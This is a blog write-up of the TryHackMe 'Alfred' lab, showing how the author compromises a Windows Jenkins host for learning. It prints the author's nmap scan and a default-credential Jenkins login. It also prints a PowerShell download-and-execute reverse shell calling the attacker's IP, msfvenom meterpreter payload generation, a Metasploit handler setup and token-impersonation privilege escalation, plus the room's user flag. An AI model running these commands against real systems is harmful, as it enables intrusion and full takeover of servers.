---
title: THM Room Walkthrough - Alfred
date: '2025-01-22 21:35:00 +0000'
author: b3rdma
categories:
  - Hacking
  - Try Hack Me
tags:
  - nmap
  - enumeration
  - privilege escalation
  - reverse shell
  - metasploit
media_subpath: /img/alfred/
---
## Contents
### Table of contents

<!-- toc -->

- [Task 1 - Initial Access](#task-1---initial-access)
- [Initial Recon - NMAP Scan Results](#initial-recon---nmap-scan-results)
- [Enumeration](#enumeration)
- [Task 2 - Switching Shells](#task-2---switching-shells)
- [Task 3 - Privilege Escalation](#task-3---privilege-escalation)

<!-- tocstop -->

## Task 1 - Initial Access

First things first, lets do a full nmap scan to see what is open on the target.
I used the following command to scan the target:

```bash
sudo nmap -sV -sC -p- -Pn -T4 10.10.131.95
```
{: .nolineno }

## Initial Recon - NMAP Scan Results

```bash

┌──(zed   kali)-[~/hacking/thm/rooms/alfred]
└─|||> sudo nmap -sV -sC -p- -Pn -T4 10.10.131.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-19 12:54 GMT
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.131.95, 16) => Protocol wrong type for socket
Offending packet: TCP 10.11.121.104:56714 > 10.10.131.95:53 S ttl=46 id=1811 iplen=11264  seq=3598359036 win=1024 <mss 1460>
Nmap scan report for 10.10.131.95
Host is up (0.038s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2025-01-18T12:49:06
|_Not valid after:  2025-07-20T12:49:06
|_ssl-date: 2025-01-19T13:41:17+00:00; -16s from scanner time.
8080/tcp open  http          Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -16s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2824.03 seconds

```
{: .nolineno }

## Enumeration

- First went to 10.10.255.69:8080 and was presented with the Jenkins login page
- Tried default `admin:admin` for username and password and that logged me in to
  back-end (default credentials for Jenkins found via search)
- In the project config page we see execution of batch commands is enabled
- Change the `whoami` default command with:

```powershell
powershell iex (New-Object
Net.WebClient).DownloadString('http://10.11.121.104:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp
-Reverse -IPAddress 10.11.121.104 -Port 4444
```
{: .nolineno }

- Save the project and then build it so it runs the payload
- Make sure to have the following two commands running on attack machine:

```bash
python3 - http.server
```
{: .nolineno }

```bash
nc -nvlp 4444
```
{: .nolineno }

- Had issues with getting the `nc` command to work on MacOS so booted up Kali
- Worked great once build of the project started on Kali; reverse shell sorted. 
- Had to search about a bit to find the flag at `C:\Users\bruce\Desktop\user.txt`
- Flag is: `79007a09481963edf2e1321abd9ae2a0`

## Task 2 - Switching Shells

The instructions on this part of the room are quite self-explanatory; however,
the steps I took are as follows:

- Use the `msfvenom` command to generate a payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata -e x86/shikata_ga_nai LHOST=10.11.121.104 LPORT=4443 -f exe -o revShell.exe
```
{: .nolineno }

- Once that is done, uploading to the target machine is the next step. In the
shell we already have, run the command 
`powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.11.121.104/revShell.exe','revShell.exe')"`
- This is now ready to use on the target, but first we need to set up Metasploit
  to listen in to it as we are using a meterpreter.
- There is a one-liner on the THM Room page that can be used but I opened
Metasploit the old way and set the required parameters; the commands listed
below in order of execution:

```bash
msfconsole
use exploit/multi/handler
set LOST 10.11.121.104
set LPORT 4443
set PAYLOAD windows/meterpreter/reverse_tcp
run
```
{: .nolineno }

- Once the meterpreter handler connects, use the command `shell` to now have the
  Windows Cmd shell prompt. 
- To answer the question in Task 2, simply run `dir` and look at the file size
(in bytes) of revShell.exe.

## Task 3 - Privilege Escalation

The Task 3 questions are pretty guided by the instructions so here I shall just
add a few screenshots of the results:

![whoami/priv command on kali
linux](20250124-alfred-whoami-priv.webp){: width="700"
height="400" }
_Execution of the `whoami/priv` command_

The next step instructs us to enter `load incognito` and follow that up with
`list_tokens -g`. See screenshot below for results:

![load incognito Meterpreter command on kali
linux](20250124-alfred-load-incognito.webp){: width="700"
height="400" }
_Execution of the `load incognito` Meterpreter command_

The observant will note that I have also run the commands `getuid` and
`impersonate_token "BUILTIN\Administrators"`; The output shows that initially we
were `alfred\bruce`. Not in the screenshot (sorry) is the output from running
the `getuid` command afterwards which will be `NT AUTHORITY\SYSTEM`.

Final steps are to get the process ID of services.exe, migrate to that process
and gain root privileges. Output of the `ps` command below:

![ps command on kali
linux](20250124-alfred-ps-command.webp){: width="700"
height="400" }
_Execution of the `ps` command_

Now we have found the PID we want, run the command `migrate <PID>`, in my case
it was `migrate 668`, and wait for the success message. Root is ours. Final
question answered by `cat`'ing the root.txt file. Location is given which is
nice 🙂. 

![cat and type command on kali
linux](20250124-alfred-final-flag.webp){: width="700"
height="400" }
_Execution of the `cat` command_

> The output from `cat` looked kind of strange to me so I entered shell and used
> `type root.txt` to confirm that the flag was correct. All shown in the
> screenshot but wanted to clarify just in case.
{: .prompt-info }

So that is Alfred completed. I hope this was helpful, informative and possibly
even interesting. Feedback is always welcome but please do view this in the
context that these are basically my learning notes. Definitely let me know if
there are errors, especially in relation to techniques/tools used. 

Thank you and Godspeed.





